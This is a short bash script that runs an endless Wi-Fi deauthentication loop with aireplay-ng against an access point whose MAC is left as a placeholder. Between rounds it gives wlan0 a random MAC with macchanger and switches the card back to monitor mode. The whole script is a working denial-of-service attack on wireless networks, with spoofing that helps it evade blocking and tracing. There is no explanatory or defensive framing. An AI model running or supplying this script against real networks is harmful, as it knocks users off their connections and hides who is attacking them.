#!/bin/bash

while true
do
          aireplay-ng -0 5 -a yours_mac wlan0
          ifconfig wlan0 down
          macchanger -r wlan0 | grep "New Mac"
          iwconfig wlan0 mode monitor
          ifconfig wlan0 up
          iwconfig wlan0 | grep mode
          sleep 3
          echo Waiting!!!

done
